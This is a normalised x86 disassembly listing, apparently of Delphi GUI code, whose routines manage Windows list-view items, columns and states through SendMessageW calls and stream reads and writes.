mov edx esi
mov eax ebx
call sub_426eb4
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_4a7908
pop esi
pop ebx
retn
sub_4a7908
push ebx
push esi
mov esi edx
mov ebx eax
push 0xffffffff
mov eax [ ebx + 0x48 ]
call sub_4a801c
push eax
mov eax ebx
call sub_4a785c
mov ecx esi
pop edx
call sub_41fa0c
mov edx esi
mov eax ebx
call sub_4a7868
pop esi
pop ebx
retn
sub_4a7960
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_448180
mov [ edi + 0x4 ] esi
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4a7758
mov [ edi + 0x8 ] eax
mov [ edi + 0x18 ] 0xffffffff
mov [ edi + 0x1c ] 0xffffffff
mov [ edi + 0x2c ] 0xffffffff
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4a79c4
push ebx
push esi
push edi
push ebp
call sub_44873c
mov ebx edx
mov ebp eax
mov [ ebp + 0x24 ] 0x1
mov eax [ ebp + 0x4 ]
mov eax [ eax + 0x4 ]
cmp ebp [ eax + 0x2c8 ]
jne r-xdata
mov eax ebp
call sub_4a7a40
call sub_496c14
test al al
je r-xdata
xor edx edx
mov [ eax + 0x2c8 ] edx
mov eax [ ebp + 0x8 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_424d94
test bl bl
jle r-xdata
mov eax ebp
call sub_4a7a6c
mov esi eax
mov eax ebp
call sub_4a801c
mov edi eax
push 0x0
push edi
push 0x1008
push esi
call SendMessageW
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4486e4
sub_4a7a80
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4a801c
push eax
mov eax esi
call sub_4a7a6c
cmp bl 0x1
cmc
sbb ecx ecx
pop edx
call sub_41f964
pop esi
pop ebx
retn
sub_4a7aa4
push ebx
push esi
mov esi eax
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x2a4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x26 ]
pop esi
pop ebx
retn
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax ebx
call sub_496868
mov ebx eax
mov eax esi
call sub_4a801c
mov esi eax
push 0xf000
push esi
push 0x102c
push ebx
call SendMessageW
shr eax 0xc
dec eax
test eax eax
setne al
pop esi
pop ebx
retn
sub_4a7af8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax edi
call sub_4a7aa4
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edi + 0x26 ] bl
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x4 ]
cmp [ esi + 0x2a4 ] 0x0
jne r-xdata
mov eax esi
call sub_496c14
test al al
je r-xdata
mov eax edi
call sub_4a801c
push eax
mov eax esi
call sub_496868
mov ecx ebx
pop edx
call sub_41f9e0
sub_4a7b44
push ebx
push esi
push edi
add esp 0xffffffcc
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x2c ]
je r-xdata
add esp 0x34
pop edi
pop esi
pop ebx
retn
mov eax esp
xor ecx ecx
mov edx 0x34
call sub_447ae4
mov [ esp ] 0x100
mov eax ebx
call sub_4a801c
mov [ esp + 0x4 ] eax
mov [ esp + 0x28 ] esi
mov eax ebx
call sub_4a7a6c
mov edi eax
mov eax esp
push eax
push 0x0
push 0x104c
push edi
call SendMessageW
mov [ ebx + 0x2c ] esi
sub_4a7b9c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4a7a6c
mov esi eax
mov eax ebx
call sub_4a801c
mov ebx eax
push 0x0
push ebx
push 0x102a
push esi
call SendMessageW
test eax eax
setne al
neg al
sbb eax eax
pop esi
pop ebx
retn
sub_4a7bcc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x20 ]
call j_sub_44a294
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x20 ]
mov edx esi
call sub_449d2c
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x2a4 ] 0x0
jne r-xdata
mov eax ebx
call sub_4a7a40
call sub_4aa874
test al al
je r-xdata
push 0xffffffff
mov eax ebx
call sub_4a801c
push eax
mov eax ebx
call sub_4a7a6c
xor ecx ecx
pop edx
call sub_41fa0c
mov eax ebx
call sub_4a7a40
movzx eax [ eax + 0x289 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov eax ebx
call sub_4a7a40
mov eax [ eax + 0x29c ]
call sub_4254d8
test eax eax
jle r-xdata
mov eax ebx
call sub_4a7a40
call sub_4ac248
mov eax ebx
call sub_4a7a40
xor edx edx
call sub_4ac52c
cmp [ eax + 0x24 ] 0xffffffff
jg r-xdata
mov eax ebx
call sub_4a7a40
call sub_4ac874
sub_4a7c80
push ebx
mov ebx eax
cmp edx [ ebx + 0x28 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x28 ] edx
mov eax ebx
call sub_4a7a40
movzx eax [ eax + 0x289 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_4a7a40
call sub_4ac248
sub al 0x2
jne r-xdata
sub_4a7cb0
push ebx
push esi
push edi
mov esi eax
cmp edx 0x4
ja r-xdata
xor ebx ebx
jmp [ edx * 4 + jump_table_4a7cc1 ]
mov ebx 0x4
jmp r-xdata
mov ebx 0x8
jmp r-xdata
mov ebx 0x1
jmp r-xdata
mov ebx 0x2
jmp r-xdata
mov ebx 0x20
jmp r-xdata
mov eax esi
call sub_4a7a6c
mov edi eax
mov eax esi
call sub_4a801c
push ebx
push eax
push 0x102c
push edi
call SendMessageW
test ebx eax
setne al
pop edi
pop esi
pop ebx
retn
sub_4a7d20
push ebx
push esi
push edi
mov ebx eax
cmp edx 0x4
ja r-xdata
xor esi esi
jmp [ edx * 4 + jump_table_4a7d31 ]
xor edi edi
mov edi esi
jmp r-xdata
mov esi 0x4
jmp r-xdata
mov esi 0x8
jmp r-xdata
mov esi 0x1
jmp r-xdata
mov esi 0x2
jmp r-xdata
mov esi 0x20
jmp r-xdata
push esi
mov eax ebx
call sub_4a801c
push eax
mov eax ebx
call sub_4a7a6c
mov ecx edi
pop edx
call sub_41f9b0
pop edi
pop esi
pop ebx
retn
test cl cl
je r-xdata
sub_4a7d90
push ebx
push esi
push edi
add esp 0xffffffcc
mov edi ecx
mov esi eax
xor ebx ebx
sub edx 0x1
jb r-xdata
cmp edi [ esi + 0xc ]
je r-xdata
je r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov [ esi + 0xc ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x2a4 ] 0x0
jne r-xdata
cmp edi [ esi + 0x18 ]
je r-xdata
dec edx
je r-xdata
add esp 0x34
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x2a4 ] 0x0
jne r-xdata
mov [ esp ] 0x2
mov [ esp + 0x1c ] 0xffffffff
mov eax esi
call sub_4a801c
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov eax esi
call sub_4a7a6c
mov edi eax
mov eax esp
push eax
push 0x0
push 0x104c
push edi
call SendMessageW
jmp r-xdata
mov bl 0x1
mov [ esi + 0x18 ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x2a4 ] 0x0
jne r-xdata
cmp edi [ esi + 0x1c ]
je r-xdata
jmp r-xdata
mov eax esi
call sub_4a801c
push eax
mov eax esi
call sub_4a801c
push eax
mov eax esi
call sub_4a7a40
pop edx
pop ecx
call sub_4aa098
push 0xf00
mov eax esi
call sub_4a801c
push eax
mov eax esi
call sub_4a7a6c
mov ecx [ esi + 0x18 ]
inc ecx
shl ecx 0x8
pop edx
call sub_41f9b0
jmp r-xdata
mov bl 0x1
mov [ esi + 0x1c ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x2cc ] 0x0
je r-xdata
cmp [ eax + 0x2a4 ] 0x0
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
push 0xf000
mov eax esi
call sub_4a801c
push eax
mov eax esi
call sub_4a7a6c
lea ecx [ edi + 0x1 ]
shl ecx 0xc
pop edx
call sub_41f9b0
xor edi edi
sub_4a7ed0
push ebx
push esi
add esp 0xffffffcc
mov ebx eax
cmp edx [ ebx + 0x10 ]
je r-xdata
add esp 0x34
pop esi
pop ebx
retn
mov [ ebx + 0x10 ] edx
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x2a4 ] 0x0
jne r-xdata
mov [ esp ] 0x10
mov [ esp + 0x24 ] edx
mov eax ebx
call sub_4a801c
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_4a7a6c
mov esi eax
mov eax esp
push eax
push 0x0
push 0x104c
push esi
call SendMessageW
mov eax ebx
call sub_4a801c
push eax
mov eax ebx
call sub_4a801c
push eax
mov eax ebx
call sub_4a7a40
pop edx
pop ecx
call sub_4aa098
sub_4a7f48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_424dc0
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4483ac
mov esi eax
mov edx [ esi + 0x20 ]
mov eax ebx
call sub_4a7bcc
mov edx [ esi + 0x28 ]
mov eax ebx
call sub_4a7c80
mov ecx [ esi + 0xc ]
xor edx edx
mov eax ebx
call sub_4a7d90
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_4a7ed0
mov ecx [ esi + 0x18 ]
mov edx 0x1
mov eax ebx
call sub_4a7d90
mov ecx [ esi + 0x1c ]
mov edx 0x2
mov eax ebx
call sub_4a7d90
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_4a8008
mov eax esi
call sub_4a7aa4
mov edx eax
mov eax ebx
call sub_4a7af8
pop esi
pop ebx
retn
sub_4a7fe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x20 ]
mov edx [ esi + 0x20 ]
call j_sub_44a294
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0x28 ]
cmp eax [ esi + 0x28 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4a8038
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
movzx eax bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_4a801c
push eax
mov eax esi
call sub_4a7a6c
mov ecx edi
pop edx
call sub_41f928
pop edi
pop esi
pop ebx
retn
sub_4a8074
push ebx
push esi
push edi
add esp 0xffffffcc
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4a7940
cmp edi eax
je r-xdata
add esp 0x34
pop edi
pop esi
pop ebx
retn
mov ecx edi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4a7954
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x2a4 ] 0x0
jne r-xdata
mov [ esp ] 0x2
mov [ esp + 0x1c ] 0xffffffff
mov eax ebx
call sub_4a801c
mov [ esp + 0x4 ] eax
inc esi
mov [ esp + 0x8 ] esi
mov eax ebx
call sub_4a7a6c
mov ebx eax
mov eax esp
push eax
push 0x0
push 0x104c
push ebx
call SendMessageW
sub_4a80e8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_448180
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4a8124
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax esi
call sub_4a82d8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424d94
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_4a815c
push ebx
push esi
push edi
push ebp
add esp 0xffffffcc
mov edi ecx
mov esi eax
test edx edx
jne r-xdata
mov ebx edx
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x10c ]
mov ebx eax
jmp r-xdata
mov eax esi
call sub_4a81e4
mov ebp eax
push esp
mov ecx ebx
mov edx edi
mov eax esi
call sub_4a8fd0
mov eax esp
push eax
push 0x0
push 0x104d
push ebp
call SendMessageW
mov eax ebx
add esp 0x34
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4a81b8
mov edi eax
test edi edi
jge r-xdata
sub_4a81b8
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_496c14
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_4a81e4
push 0x0
push 0x0
push 0x1004
push eax
call SendMessageW
pop ebx
retn
sub_4a81f0
push ebx
push esi
push edi
add esp 0xffffffcc
mov edi edx
mov ebx eax
xor esi esi
mov eax [ ebx + 0x4 ]
call sub_496868
test eax eax
je r-xdata
mov eax esi
add esp 0x34
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x2a4 ] 0x0
je r-xdata
mov [ esp ] 0x4
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_4a81e4
mov ebx eax
mov eax esp
push eax
push 0x0
push 0x104b
push ebx
call SendMessageW
test eax eax
je r-xdata
mov eax esp
xor ecx ecx
mov edx 0x34
call sub_447ae4
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0x8 ] eax
mov edx esp
mov eax [ ebx + 0x4 ]
call sub_4aab90
mov esi eax
jmp r-xdata
mov esi [ esp + 0x20 ]
sub_4a82a4
push ebx
mov ebx edx
test ebx ebx
je r-xdata
call sub_4a81e4
push 0x0
push ebx
push 0x102f
push eax
call SendMessageW
pop ebx
retn
call sub_4a81e4
push 0x1
push ebx
push 0x102f
push eax
call SendMessageW
pop ebx
retn
sub_4a82d8
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_496c14
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4a81e4
mov ebx eax
push 0x0
push 0x0
push 0x1009
push ebx
call SendMessageW
sub_4a831c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
test dl dl
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
movzx edx [ eax + 0x289 ]
mov [ eax + 0x2e8 ] dl
xor edx edx
call sub_4ac280
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x29c ]
call sub_4254d8
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
movzx edx [ eax + 0x2e8 ]
call sub_4ac280
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x29c ]
call sub_4254d8
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
push 0xb
mov eax [ ebp - 0x4 ]
call sub_4a81e4
push eax
call SendMessageW
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4aa874
test al al
je r-xdata
inc esi
xor edi edi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
xor eax eax
push ebp
push sub_4a84a2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x1
push 0xb
mov eax [ ebp - 0x4 ]
call sub_4a81e4
push eax
call SendMessageW
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x0
retn
inc esi
xor edi edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4aa880
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov [ ebx + 0x20 ] eax
mov eax ebx
call sub_4a7128
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_4a6fb8
inc edi
dec esi
jne r-xdata
mov edx eax
mov eax ebx
call sub_4a71a8
xor eax eax
mov [ ebx + 0x20 ] eax
push 0x0
push 0x0
push 0xb
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x2bc ]
push eax
call SendMessageW
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x29c ]
mov edx edi
call sub_4a734c
mov ebx eax
mov eax [ ebx + 0x24 ]
test eax eax
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x29c ]
mov edx edi
call sub_4a734c
mov ebx eax
mov eax [ ebx + 0x20 ]
test eax eax
jge r-xdata
sub_4a84fc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx ebx
mov eax edi
call sub_424dc0
mov eax edi
call sub_4a82d8
mov ebp ebx
mov eax ebp
call sub_4a81b8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax ebp
call sub_4a81f0
push eax
mov eax edi
call sub_4a8150
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
jmp r-xdata
sub_4a855c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + 0x20 ]
test edi edi
jne r-xdata
mov eax edi
call sub_4a81b8
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4a81b8
cmp ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4a81b8
test eax eax
setg bl
jmp r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4a81b8
dec eax
test eax eax
jl r-xdata
mov bl 0x1
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx esi
mov eax edi
call sub_4a81f0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_4a81f0
pop edx
call sub_4a7fe0
mov ebx eax
xor bl 0x1
test bl bl
jne r-xdata
sub_4a85ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_424e98
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov eax [ ebp - 0x8 ]
push eax
push sub_4a8888
mov eax [ ebp - 0x8 ]
push eax
push sub_4a8c80
push ebp
call sub_4a855c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4a8888
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4a8bf3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_4a82d8
lea edx [ ebp - 0x17 ]
mov ecx 0x1
mov eax esi
call sub_4274c8
cmp [ ebp - 0x17 ] 0x1
jne r-xdata
cmp [ ebp - 0x17 ] 0x3
jne r-xdata
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax esi
call sub_4274c8
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax esi
call sub_4274c8
mov eax [ ebp - 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a8bfa
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax esi
call sub_4274c8
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax esi
call sub_4274c8
mov eax [ ebp - 0x14 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_4a81b8
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x1c ] eax
inc eax
mov [ ebp - 0x1c ] eax
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x4 ]
call j_sub_44a5d8
mov edx eax
movzx eax [ ebp - 0x29 ]
mov ecx eax
add ecx ecx
mov eax esi
call sub_4274c8
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x20 ]
call sub_4a7bcc
mov ebx [ ebp - 0x31 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebx
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
lea eax [ ebp - 0x4 ]
call j_sub_44a5d8
mov edx eax
movzx eax [ ebp - 0x3e ]
mov ecx eax
add ecx ecx
mov eax esi
call sub_4274c8
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x24 ]
call sub_4a7bcc
mov ebx [ ebp - 0x4a ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebx
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x1c ]
jne r-xdata
inc ebx
xor edi edi
dec [ ebp - 0x1c ]
jne r-xdata
inc ebx
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov ebx eax
dec [ ebp - 0x1c ]
jne r-xdata
inc ebx
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4a81f0
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
lea edx [ ebp - 0x16 ]
mov ecx 0x2
mov eax esi
call sub_4274c8
movsx ecx [ ebp - 0x16 ]
mov edx edi
mov eax [ ebp - 0x28 ]
call sub_4a8074
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x3d ]
mov ecx 0x15
mov eax esi
call sub_4274c8
mov eax [ ebp - 0x8 ]
call sub_4a8150
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x3d ]
xor edx edx
mov eax [ ebp - 0x20 ]
call sub_4a7d90
mov ecx [ ebp - 0x35 ]
mov edx 0x1
mov eax [ ebp - 0x20 ]
call sub_4a7d90
mov ecx [ ebp - 0x39 ]
mov edx 0x2
mov eax [ ebp - 0x20 ]
call sub_4a7d90
mov edx [ ebp - 0x2d ]
mov eax [ ebp - 0x20 ]
call sub_4a7c80
or edx 0xffffffff
mov eax [ ebp - 0x20 ]
call sub_4a7b44
movzx edx [ ebp - 0x29 ]
lea eax [ ebp - 0x4 ]
call sub_449fd0
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
call j_sub_44a5d8
mov edx eax
movzx eax [ ebp - 0x18 ]
mov ecx eax
add ecx ecx
mov eax esi
call sub_4274c8
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec ebx
jne r-xdata
mov eax edi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
lea edx [ ebp - 0x56 ]
mov ecx 0x19
mov eax esi
call sub_4274c8
mov eax [ ebp - 0x8 ]
call sub_4a8150
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x56 ]
xor edx edx
mov eax [ ebp - 0x24 ]
call sub_4a7d90
mov ecx [ ebp - 0x4e ]
mov edx 0x1
mov eax [ ebp - 0x24 ]
call sub_4a7d90
mov ecx [ ebp - 0x52 ]
mov edx 0x2
mov eax [ ebp - 0x24 ]
call sub_4a7d90
mov edx [ ebp - 0x42 ]
mov eax [ ebp - 0x24 ]
call sub_4a7c80
mov edx [ ebp - 0x46 ]
mov eax [ ebp - 0x24 ]
call sub_4a7b44
movzx edx [ ebp - 0x3e ]
lea eax [ ebp - 0x4 ]
call sub_449fd0
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
lea eax [ ebp - 0x4 ]
call j_sub_44a5d8
mov edx eax
movzx eax [ ebp - 0x18 ]
mov ecx eax
add ecx ecx
mov eax esi
call sub_4274c8
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
dec ebx
jne r-xdata
mov eax edi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax esi
call sub_4274c8
movzx edx [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
call sub_449fd0
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edi eax
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax esi
call sub_4274c8
movzx edx [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
call sub_449fd0
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edi eax
sub_4a8c04
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4a8c71
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_449d80
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
add eax eax
mov ebx eax
cmp ebx 0x1fe
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a8c78
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov ebx 0x1fe
sub_4a8c80
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4a8fa8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
call sub_4a81b8
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_4a81b8
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1b ] 0x3
lea edx [ ebp - 0x1b ]
mov ecx 0x1
mov eax [ ebp - 0xc ]
call sub_427500
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_427500
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_427500
mov eax [ ebp - 0x8 ]
call sub_4a81b8
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x8 ]
call sub_4a81b8
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x18 ]
add eax 0x19
add [ ebp - 0x14 ] eax
inc [ ebp - 0x10 ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a8faf
lea eax [ ebp - 0x4c ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x10 ] 0x0
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_4a81f0
mov eax [ eax + 0x20 ]
call sub_4a8c04
inc eax
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_4a81f0
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
